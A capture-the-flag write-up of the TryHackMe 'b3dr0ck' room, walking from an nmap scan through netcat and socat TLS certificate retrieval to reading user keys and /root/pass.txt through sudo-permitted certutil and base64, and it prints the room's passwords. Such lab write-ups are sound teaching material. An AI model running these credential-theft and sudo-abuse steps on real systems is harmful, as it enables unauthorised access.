---
title: "THM: b3dr0ck"
date: 2025-11-23 15:00:00 +1000
categories: [TryHackMe, Medium]
tags: [linux, tls, certificates, socat, sudo-abuse, certutil, base64, base32]
---

![Banner](/assets/Images/b3dr0ck/banner.png)

Linux box with custom TLS services. Retrieved client certificates from credential distribution service, authenticated as multiple users through TLS client auth, and escalated via sudo abuse of certutil and base encoding tools.

## Initial Enumeration

### Nmap Scan
```
sudo nmap -T4 -sS -sV -p- TARGET_IP -vvv
```

**Results:**
```
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp    open     http           nginx 1.18.0 (Ubuntu)
9009/tcp  open     pichat?
54321/tcp open     ssl/unknown
```

**Key Findings:**
- Port 9009: Custom service for retrieving TLS credentials
- Port 54321: TLS-enabled authentication service

---

## TLS Credential Retrieval

### Connecting to Port 9009
```
nc -nv TARGET_IP 9009
```

Service offers client certificate and private key retrieval.

### Downloading Credentials
```
nc -nv TARGET_IP 9009
> client certificate
```

Save to `client.cert.rsa`
```
nc -nv TARGET_IP 9009
> private key
```

Save to `private.key.rsa`

---

## TLS Authentication - Barney
```
socat stdio ssl:TARGET_IP:54321,cert=client.cert.rsa,key=private.key.rsa,verify=0
```

**Result:** Authenticated as Barney Rubble

Password hint: `d1ad7c0a3805955a35eb260dab4180dd` (MD5)

Cracked via CrackStation.

---

## SSH Access - Barney
```
ssh barney@TARGET_IP
```

Successfully logged in.

---

## Privilege Escalation
```
sudo -l
```

**Output:** Can run `/usr/bin/certutil` as root
```
sudo /usr/bin/certutil ls
sudo /usr/bin/certutil cat fred
```

Extracted Fred's TLS certificate and key.

---

## TLS Authentication - Fred
```
socat stdio ssl:TARGET_IP:54321,cert=fred.cert,key=fred.key,verify=0
```

Fred's password revealed: YabbaDabbaDO000!

---

## SSH Access - Fred
```
ssh fred@TARGET_IP
```

Flag obtained from `/home/fred/fred.txt`

---

## Root Escalation
```
sudo -l
```

**Output:** Can run base32/base64 on `/root/pass.txt`
```
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```

Output: `a00a12aad6b7c16bf07032bd05a31d56`

Cracked via CrackStation: `flintstonesvitamins`

---

## Root Access
```
su root
```

Password: flintstonesvitamins

Root achieved!

---

## Notable Commands

| Command | Description |
|---------|-------------|
| `nc -nv IP PORT` | Connect to TCP service |
| `socat stdio ssl:IP:PORT,cert=,key=,verify=0` | TLS client cert auth |
| `certutil ls` | List certificates |
| `base64 -d` | Decode base64 |
| `base32 -d` | Decode base32 |

---

## Key Takeaways

- Custom TLS services require certificate-based authentication
- Sudo abuse with certutil exposes other users' credentials
- Multi-stage encoding (base64/base32) obfuscates but doesn't protect passwords
- MD5 hashes crack instantly with rainbow tables

---

**Room:** b3dr0ck | **Platform:** TryHackMe | **Difficulty:** Medium | **Attack Path:** TLS Certs → Sudo Abuse → Multi-stage Decoding
